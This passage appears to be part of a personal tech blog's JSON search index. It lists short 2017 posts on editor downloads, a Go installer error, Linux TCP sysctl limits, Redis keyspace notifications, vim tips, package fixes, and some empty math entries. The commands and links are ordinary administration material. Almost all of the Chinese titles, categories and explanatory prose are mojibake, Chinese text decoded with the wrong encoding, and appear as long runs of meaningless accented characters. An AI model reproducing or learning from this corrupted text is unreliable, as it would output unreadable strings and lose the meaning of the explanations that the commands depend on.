%1","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"å„ç§ç¼–è¾‘å™¨å®˜æ–¹ä¸‹è½½åœ°å€","slug":"history/tech/59b3f39a1db485493d6cc381","date":"2017-09-09T01:58:50.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59b3f39a1db485493d6cc381/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59b3f39a1db485493d6cc381/","excerpt":"","text":"sublime text3ï¼šhttp://www.sublimetext.com/3notepad++ï¼šhttps://notepad-plus-plus.org","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"windows ä¸‹ å®‰è£… go å‡ºç° 2502/2503 é”™è¯¯ç ","slug":"history/tech/59b3ebd51db485493d6cc380","date":"2017-09-09T01:25:41.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59b3ebd51db485493d6cc380/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59b3ebd51db485493d6cc380/","excerpt":"","text":"ç®¡ç†å‘˜èº«ä»½è¿è¡Œå‘½ä»¤æç¤ºç¬¦ï¼šmsiexec /package &quot;C:\\Users\\Administrator\\Desktop\\go1.9.windows-amd64.msi&quot;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"go ç®€ä»‹","slug":"history/tech/59b3e1031db485493d6cc37f","date":"2017-09-09T00:39:31.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59b3e1031db485493d6cc37f/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59b3e1031db485493d6cc37f/","excerpt":"","text":"wikiåŸï¼šcode.google.com/p/go-wiki/w/listå·²è¿ç§»ï¼šhttps://github.com/golang/go/wiki qq ç¾¤https://docs.google.com/spreadsheets/d/13Q6whxkLpYxDkLFJnbMPR5VlkiM322WeJSjGgopjtNk/edit æŸ¥çœ‹ç¯å¢ƒå˜é‡ go env æµ‹è¯•æ–‡ä»¶ *_test.go é»˜è®¤æ˜¯æµ‹è¯•æ–‡ä»¶ æŸ¥çœ‹å¸®åŠ©æŸ¥çœ‹åŒ…å¸®åŠ©ï¼š go doc fmt æŸ¥çœ‹åŒ…å†…å•ä¸ªå‡½æ•°ï¼š godoc fmt Println godoc cmd/fmt Println å¯åŠ¨ doc æœåŠ¡: godoc -http=:8080","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"Sizzle é€‰æ‹©å™¨","slug":"history/tech/59b29a071db485493d6cc37e","date":"2017-09-08T01:24:23.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/59b29a071db485493d6cc37e/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59b29a071db485493d6cc37e/","excerpt":"","text":"Sizzle é€‰æ‹©å™¨","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"çº¿ä¸Šå·¥å…·é“¾ å®˜æ–¹ä¸‹è½½","slug":"history/tech/59b25b951db485493d6cc37d","date":"2017-09-07T20:57:57.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/59b25b951db485493d6cc37d/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59b25b951db485493d6cc37d/","excerpt":"","text":"The Definitive Guide for Production Tools ï¼šhttp://land.overops.com/production-tools/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"vscode é…ç½®å¼€å‘ç¯å¢ƒ å®˜æ–¹æ–‡æ¡£","slug":"history/tech/59b113f61db485493d6cc37c","date":"2017-09-06T21:40:06.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/59b113f61db485493d6cc37c/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59b113f61db485493d6cc37c/","excerpt":"","text":"https://code.visualstudio.com/docs/?dv=win","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"æ·±åº¦å­¦ä¹ ç½‘ç«™","slug":"history/tech/59ad57b81db485493d6cc37b","date":"2017-09-04T01:40:08.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/59ad57b81db485493d6cc37b/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59ad57b81db485493d6cc37b/","excerpt":"","text":"http://zh.gluon.ai/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"python mysqlåº“å®‰è£…","slug":"history/tech/59a8d8901db485493d6cc378","date":"2017-09-01T03:48:32.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/59a8d8901db485493d6cc378/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59a8d8901db485493d6cc378/","excerpt":"","text":"æŠ¥é”™ï¼šroot@localhost:~/test# pip install mysql-python Collecting mysql-python Using cached MySQL-python-1.2.5.zip Complete output from command python setup.py egg_info: sh: mysql_config: command not found Traceback (most recent call last): File &quot;&lt;string&gt;&quot;, line 1, in &lt;module&gt; File &quot;/tmp/pip-build-vkQhN1/mysql-python/setup.py&quot;, line 17, in &lt;module&gt; metadata, options = get_config() File &quot;/tmp/pip-build-vkQhN1/mysql-python/setup_posix.py&quot;, line 43, in get_config libs = mysql_config(&quot;libs_r&quot;) File &quot;/tmp/pip-build-vkQhN1/mysql-python/setup_posix.py&quot;, line 25, in mysql_config raise EnvironmentError(&quot;%s not found&quot; % (mysql_config.path,)) EnvironmentError: mysql_config not found è§£å†³ï¼šapt-get install libmysqlclient-dev","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"snowflakes","slug":"history/tech/59a91cf71db485493d6cc37a","date":"2017-08-31T20:40:23.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/59a91cf71db485493d6cc37a/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59a91cf71db485493d6cc37a/","excerpt":"","text":"https://github.com/wujunshen/vesta-id-generator","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ä¿®æ”¹ç½‘ç»œå†…æ ¸å¯¹TCPè¿æ¥çš„æœ‰å…³é™åˆ¶","slug":"history/tech/59a9123e1db485493d6cc379","date":"2017-08-31T19:54:38.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/59a9123e1db485493d6cc379/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59a9123e1db485493d6cc379/","excerpt":"","text":"å°½ç®¡å·²ç»è§£é™¤äº†ç³»ç»Ÿå¯¹ç”¨æˆ·åŒæ—¶æ‰“å¼€æ–‡ä»¶æ•°çš„é™åˆ¶ï¼Œä½†ä»ä¼šå‡ºç°å¹¶å‘TCPè¿æ¥æ•°å¢åŠ åˆ°ä¸€å®šæ•°é‡æ—¶ï¼Œå†ä¹Ÿæ— æ³•æˆåŠŸå»ºç«‹æ–°çš„TCPè¿æ¥ã€‚åŸå› ä¸€ï¼š æœ¬åœ°ç«¯å£å·èŒƒå›´æœ‰é™åˆ¶é—®é¢˜å‡ºåœ¨connect()è°ƒç”¨è¿”å›å¤±è´¥ï¼ŒæŸ¥çœ‹ç³»ç»Ÿé”™è¯¯æç¤ºæ¶ˆæ¯æ˜¯ â€œCanâ€™t assign requestedaddressâ€ã€‚åŒæ—¶ï¼Œå¦‚æœåœ¨æ­¤æ—¶ç”¨ tcpdump å·¥å…·ç›‘è§†ç½‘ç»œï¼Œä¼šå‘ç°æ ¹æœ¬æ²¡æœ‰TCPè¿æ¥æ—¶å®¢æˆ·ç«¯å‘SYNåŒ…çš„ç½‘ç»œæµé‡ã€‚è¿™äº›æƒ…å†µè¯´æ˜é—®é¢˜åœ¨äºæœ¬åœ°Linuxç³»ç»Ÿå†…æ ¸ä¸­æœ‰é™åˆ¶ã€‚å…¶å®ï¼Œé—®é¢˜çš„æ ¹æœ¬åŸå› åœ¨äºLinuxå†…æ ¸çš„TCP/IPåè®®å®ç°æ¨¡å—å¯¹ç³»ç»Ÿä¸­æ‰€æœ‰çš„å®¢æˆ·ç«¯TCPè¿æ¥å¯¹åº”çš„æœ¬åœ°ç«¯å£å·çš„èŒƒå›´è¿›è¡Œäº†é™åˆ¶(ä¾‹å¦‚é—´)ã€‚å½“ç³»ç»Ÿä¸­æŸä¸€æ—¶åˆ»åŒæ—¶å­˜åœ¨å¤ªå¤šçš„TCPå®¢æˆ·ç«¯è¿æ¥æ—¶ï¼Œç”±äºæ¯ä¸ªTCPå®¢æˆ·ç«¯è¿æ¥éƒ½è¦å ç”¨ä¸€ä¸ªå”¯ä¸€çš„æœ¬åœ°ç«¯ï¼Œå†…æ ¸é™åˆ¶æœ¬åœ°ç«¯å£å·çš„èŒƒå›´ä¸º1024~32768ä¹‹ä¸­)ï¼Œå¦‚æœç°æœ‰çš„TCPå®¢æˆ·ç«¯è¿æ¥å·²å°†æ‰€æœ‰çš„æœ¬åœ°ç«¯å£å·å æ»¡ï¼Œåˆ™æ­¤æ—¶å°±æ— æ³•ä¸ºæ–°çš„TCPå®¢æˆ·ç«¯è¿æ¥åˆ†é…ä¸€ä¸ªæœ¬åœ°ç«¯å£å·äº†ï¼Œå› æ­¤ç³»ç»Ÿä¼šåœ¨è¿™ç§æƒ…å†µä¸‹åœ¨connect()è°ƒç”¨ä¸­è¿”å›å¤±è´¥ï¼Œå¹¶å°†é”™è¯¯æç¤ºæ¶ˆæ¯è®¾ä¸ºâ€œCanâ€™t assignrequested addressâ€ã€‚æœ‰å…³è¿™äº›æ§åˆ¶é€»è¾‘å¯ä»¥æŸ¥çœ‹Linuxå†…æ ¸æºä»£ç ï¼Œä»¥linux2.6å†…æ ¸ä¸ºä¾‹ï¼Œå¯ä»¥æŸ¥çœ‹tcp_ipv4.cæ–‡ä»¶ä¸­å¦‚ä¸‹å‡½æ•°ï¼š static int tcp_v4_hash_connect(struct sock *sk) è¯·æ³¨æ„ä¸Šè¿°å‡½æ•°ä¸­å¯¹å˜é‡ sysctl_local_port_range çš„è®¿é—®æ§åˆ¶ã€‚å˜é‡ sysctl_local_port_range çš„åˆå§‹åŒ–åˆ™æ˜¯åœ¨ tcp.c æ–‡ä»¶ä¸­çš„å¦‚ä¸‹å‡½æ•°ä¸­è®¾ç½®ï¼š void __init tcp_init(void) è§£å†³æ–¹æ¡ˆ: vim /etc/sysctl.conf net.ipv4.ip_local_port_range = 1024 65000 # ç«¯å£èŒƒå›´çš„æœ€å¤§å€¼åˆ™åº”å°äºæˆ–ç­‰äº65535ï¼Œç†è®ºä¸Šå•ç‹¬ä¸€ä¸ªè¿›ç¨‹æœ€å¤šå¯ä»¥åŒæ—¶å»ºç«‹60000å¤šä¸ªTCPå®¢æˆ·ç«¯è¿æ¥ sysctl -p åŸå› äºŒï¼šLinuxç½‘ç»œå†…æ ¸çš„IP_TABLEé˜²ç«å¢™å¯¹æœ€å¤§è·Ÿè¸ªçš„TCPè¿æ¥æ•°æœ‰é™åˆ¶ã€‚æ­¤æ—¶ç¨‹åºä¼šè¡¨ç°ä¸ºåœ¨ connect()è°ƒç”¨ä¸­é˜»å¡ï¼Œå¦‚åŒæ­»æœºï¼Œå¦‚æœç”¨ tcpdump å·¥å…·ç›‘è§†ç½‘ç»œï¼Œä¹Ÿä¼šå‘ç°æ ¹æœ¬æ²¡æœ‰ TCP è¿æ¥æ—¶å®¢æˆ·ç«¯å‘ SYN åŒ…çš„ç½‘ç»œæµé‡ã€‚ç”±äº IP_TABLEé˜²ç«å¢™åœ¨å†…æ ¸ä¸­ä¼šå¯¹æ¯ä¸ªTCPè¿æ¥çš„çŠ¶æ€è¿›è¡Œè·Ÿè¸ªï¼Œè·Ÿè¸ªä¿¡æ¯å°†ä¼šæ”¾åœ¨ä½äºå†…æ ¸å†…å­˜ä¸­çš„conntrackdatabaseä¸­ï¼Œè¿™ä¸ªæ•°æ®åº“çš„å¤§å°æœ‰é™ï¼Œå½“ç³»ç»Ÿä¸­å­˜åœ¨è¿‡å¤šçš„TCPè¿æ¥æ—¶ï¼Œæ•°æ®åº“å®¹é‡ä¸è¶³ï¼ŒIP_TABLEæ— æ³•ä¸ºæ–°çš„TCPè¿æ¥å»ºç«‹è·Ÿè¸ªä¿¡æ¯ï¼Œäºæ˜¯è¡¨ç°ä¸ºåœ¨connect()è°ƒç”¨ä¸­é˜»å¡ã€‚æ­¤æ—¶å°±å¿…é¡»ä¿®æ”¹å†…æ ¸å¯¹æœ€å¤§è·Ÿè¸ªçš„TCPè¿æ¥æ•°çš„é™åˆ¶ï¼Œæ–¹æ³•åŒä¿®æ”¹å†…æ ¸å¯¹æœ¬åœ°ç«¯å£å·èŒƒå›´çš„é™åˆ¶æ˜¯ç±»ä¼¼çš„ï¼š vim /etc/sysctl.conf net.ipv4.ip_conntrack_max = 10240 # ç³»ç»Ÿå¯¹æœ€å¤§è·Ÿè¸ªçš„TCPè¿æ¥æ•°é™åˆ¶è®¾ç½®ä¸º10240ï¼Œæ­¤é™åˆ¶å€¼è¦å°½é‡å°ï¼Œä»¥èŠ‚çœå¯¹å†…æ ¸å†…å­˜çš„å ç”¨ã€‚ç†è®ºä¸Šå•ç‹¬ä¸€ä¸ªè¿›ç¨‹æœ€å¤šå¯ä»¥åŒæ—¶å»ºç«‹10000å¤šä¸ªTCPå®¢æˆ·ç«¯è¿æ¥ $ sysctl -p","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"æ–¹ç¨‹ç»„è§£çš„å……è¦æ¡ä»¶","slug":"history/math/59a7c1e00dba5b0a0dc9b579","date":"2017-08-30T19:59:28.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/math/59a7c1e00dba5b0a0dc9b579/","link":"","permalink":"https://wangxiuwen.github.io/history/math/59a7c1e00dba5b0a0dc9b579/","excerpt":"","text":"","categories":[{"name":"æ•°å­¦","slug":"æ•°å­¦","permalink":"https://wangxiuwen.github.io/categories/%E6%95%B0%E5%AD%A6/"}],"tags":[{"name":"math","slug":"math","permalink":"https://wangxiuwen.github.io/tags/math/"},{"name":"æ•°å­¦","slug":"æ•°å­¦","permalink":"https://wangxiuwen.github.io/tags/%E6%95%B0%E5%AD%A6/"}],"author":"wangxiuwen"},{"title":"é«˜æ–¯æ¶ˆå»","slug":"history/math/59a7b9e40dba5b0a0dc9b578","date":"2017-08-30T19:25:24.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/math/59a7b9e40dba5b0a0dc9b578/","link":"","permalink":"https://wangxiuwen.github.io/history/math/59a7b9e40dba5b0a0dc9b578/","excerpt":"","text":"","categories":[{"name":"æ•°å­¦","slug":"æ•°å­¦","permalink":"https://wangxiuwen.github.io/categories/%E6%95%B0%E5%AD%A6/"}],"tags":[{"name":"math","slug":"math","permalink":"https://wangxiuwen.github.io/tags/math/"},{"name":"æ•°å­¦","slug":"æ•°å­¦","permalink":"https://wangxiuwen.github.io/tags/%E6%95%B0%E5%AD%A6/"}],"author":"wangxiuwen"},{"title":"ä¸‰ç»´å¹³é¢çš„äº¤ç‚¹","slug":"history/math/59a67b4e0dba5b0a0dc9b577","date":"2017-08-29T20:46:06.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/math/59a67b4e0dba5b0a0dc9b577/","link":"","permalink":"https://wangxiuwen.github.io/history/math/59a67b4e0dba5b0a0dc9b577/","excerpt":"","text":"ä¸¤ä¸ªå¹³é¢ï¼š ä¸‰ä¸ªå¹³é¢ï¼š ç»“è®ºï¼š","categories":[{"name":"æ•°å­¦","slug":"æ•°å­¦","permalink":"https://wangxiuwen.github.io/categories/%E6%95%B0%E5%AD%A6/"}],"tags":[{"name":"math","slug":"math","permalink":"https://wangxiuwen.github.io/tags/math/"},{"name":"æ•°å­¦","slug":"æ•°å­¦","permalink":"https://wangxiuwen.github.io/tags/%E6%95%B0%E5%AD%A6/"}],"author":"wangxiuwen"},{"title":"apache è®¾ç½®ç¯å¢ƒå˜é‡","slug":"history/tech/59a51e2b0dba5b0a0dc9b576","date":"2017-08-28T19:56:27.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/59a51e2b0dba5b0a0dc9b576/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59a51e2b0dba5b0a0dc9b576/","excerpt":"","text":"éœ€è¦åœ¨ VirtualHost æ ‡ç­¾ä¸­ï¼š SetEnv PHP_ENV production","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"Redis Keyspace Notifications","slug":"history/tech/59a3cf8e0dba5b0a0dc9b575","date":"2017-08-27T20:08:46.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/59a3cf8e0dba5b0a0dc9b575/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59a3cf8e0dba5b0a0dc9b575/","excerpt":"","text":"ä¿®æ”¹redis.conf æˆ–è€…é€šè¿‡config.set: notify-keyspace-events &quot;Ex&quot; ç»ˆç«¯1è¾“å…¥ï¼š redis-cli --csv psubscribe '__key*__:*' å¦å¼€ç»ˆç«¯è¾“å…¥ root@test:~# redis-cli 127.0.0.1:6379&gt; setex aaa 5 2 OK 127.0.0.1:6379&gt; ç»ˆç«¯1ä¸­æ¥æ”¶ï¼š root@test:~# redis-cli --csv psubscribe '__key*__:*' Reading messages... (press Ctrl-C to quit) &quot;psubscribe&quot;,&quot;__key*__:*&quot;,1 &quot;pmessage&quot;,&quot;__key*__:*&quot;,&quot;__keyevent@0__:expired&quot;,&quot;aaa&quot; å‚è€ƒèµ„æ–™https://redis.io/topics/notifications http://doc.redisfans.com/topic/notification.html","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"é€šè¿‡ ip æŸ¥è¯¢åŸŸåçš„ç½‘ç«™","slug":"history/tech/59a2db820dba5b0a0dc9b574","date":"2017-08-27T02:47:30.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/59a2db820dba5b0a0dc9b574/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59a2db820dba5b0a0dc9b574/","excerpt":"","text":"http://www.yougetsignal.com/tools/web-sites-on-web-server/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"å‰ä»–ç½‘ç«™","slug":"history/music/599fb5bc0dba5b0a0dc9b573","date":"2017-08-24T17:29:32.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/music/599fb5bc0dba5b0a0dc9b573/","link":"","permalink":"https://wangxiuwen.github.io/history/music/599fb5bc0dba5b0a0dc9b573/","excerpt":"","text":"http://www.the-art-of-guitar.com","categories":[{"name":"éŸ³ä¹","slug":"éŸ³ä¹","permalink":"https://wangxiuwen.github.io/categories/%E9%9F%B3%E4%B9%90/"}],"tags":[{"name":"music","slug":"music","permalink":"https://wangxiuwen.github.io/tags/music/"},{"name":"éŸ³ä¹","slug":"éŸ³ä¹","permalink":"https://wangxiuwen.github.io/tags/%E9%9F%B3%E4%B9%90/"}],"author":"wangxiuwen"},{"title":"vim åœ¨è¡Œé¦–æˆ–è¡Œå°¾æ·»åŠ å­—ç¬¦","slug":"history/tech/599ab5900dba5b0a0dc9b572","date":"2017-08-20T22:27:28.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/599ab5900dba5b0a0dc9b572/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/599ab5900dba5b0a0dc9b572/","excerpt":"","text":"è¡Œé¦– :%s/^/your_word/ è¡Œå°¾ :%s/$/your_word/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"dubboç±»å›¾","slug":"history/tech/5993f76e0dba5b0a0dc9b571","date":"2017-08-15T19:42:38.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5993f76e0dba5b0a0dc9b571/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5993f76e0dba5b0a0dc9b571/","excerpt":"","text":"","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"åˆ¤æ–­ä¸¤ä¸ªå¹³é¢é‡åˆ","slug":"history/math/5993e8ca0dba5b0a0dc9b570","date":"2017-08-15T18:40:10.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/math/5993e8ca0dba5b0a0dc9b570/","link":"","permalink":"https://wangxiuwen.github.io/history/math/5993e8ca0dba5b0a0dc9b570/","excerpt":"","text":"ä»ç¬¬ä¸€ä¸ªå¹³é¢æ‰¾ä¸€ä¸ªç‚¹ï¼Œå†ä»ç¬¬äºŒä¸ªå¹³é¢æ‰¾ä¸€ä¸ªç‚¹ï¼Œå¦‚æœä¸¤ä¸ªç‚¹çš„è¿çº¿ä¸å¹³é¢çš„æ³•å‘é‡æ­£äº¤ï¼Œåˆ™ä¸¤å¹³é¢ä¸ºåŒä¸€å¹³é¢ã€‚æ³¨æ„ï¼šæœ€åä¸€å¯¹ç¬¬ä¸€ä¸ªæ–¹ç¨‹å¼çš„ z è½´åæ ‡åº”è¯¥æ˜¯ -7.212ï¼Œè€Œä¸æ˜¯ -7.217ã€‚æ–¹æ³•ï¼šé€šè¿‡å˜æ¢ç³»æ•°ï¼Œå¦‚æœèƒ½ä¹˜é™¤ä¸€ä¸ªå…¬å› å­å¾—åˆ°ç›¸åŒçš„æ–¹ç¨‹åˆ™ä¸ºåŒä¸€å¹³é¢ï¼Œ å¦‚æœåªæ˜¯kä¸åŒï¼Œåˆ™ä¸ºå¹³è¡Œå¹³é¢ã€‚å¦åˆ™ä¸ºç›¸äº¤å¹³é¢ã€‚","categories":[{"name":"æ•°å­¦","slug":"æ•°å­¦","permalink":"https://wangxiuwen.github.io/categories/%E6%95%B0%E5%AD%A6/"}],"tags":[{"name":"math","slug":"math","permalink":"https://wangxiuwen.github.io/tags/math/"},{"name":"æ•°å­¦","slug":"æ•°å­¦","permalink":"https://wangxiuwen.github.io/tags/%E6%95%B0%E5%AD%A6/"}],"author":"wangxiuwen"},{"title":"ubuntu å¼‚å¸¸æ— æ³•è¿œç¨‹ç™»å½•","slug":"history/tech/59910e660dba5b0a0dc9b56f","date":"2017-08-14T02:43:50.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/59910e660dba5b0a0dc9b56f/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59910e660dba5b0a0dc9b56f/","excerpt":"","text":"ssh è¿œç¨‹æ— æ³•è¿æ¥æœåŠ¡å™¨ï¼Œ æ§åˆ¶å°ç™»å½•æŸ¥çœ‹ï¼šè¿™ä¸ªç¨‹åºæ˜¯ä¸€ä¸ªç´¢å¼•æ‰«æè¿›ç¨‹ï¼Œä¼šè‡ªåŠ¨åœ¨åå°å¯åŠ¨ã€‚ä¸»è¦ç”¨æ¥ç´¢å¼•è½¯ä»¶åŒ…çš„æ‰©å±•æ•°æ®ï¼Œä¸æ˜¯ç³»ç»Ÿçš„å¿…é€‰ä¾èµ–ï¼Œå¯¹æ–°ç«‹å¾—ç­‰ç¨‹åºæ²¡æœ‰å½±å“ã€‚ç›´æ¥å¹²æ‰ï¼šapt-get autoremove --purge apt-xapian-index","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"äºŒç»´ç©ºé—´é‡Œçš„ç›´çº¿","slug":"history/math/5983e8c51f6e62230f2aa012","date":"2017-08-04T03:23:49.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/math/5983e8c51f6e62230f2aa012/","link":"","permalink":"https://wangxiuwen.github.io/history/math/5983e8c51f6e62230f2aa012/","excerpt":"","text":"","categories":[{"name":"æ•°å­¦","slug":"æ•°å­¦","permalink":"https://wangxiuwen.github.io/categories/%E6%95%B0%E5%AD%A6/"}],"tags":[{"name":"math","slug":"math","permalink":"https://wangxiuwen.github.io/tags/math/"},{"name":"æ•°å­¦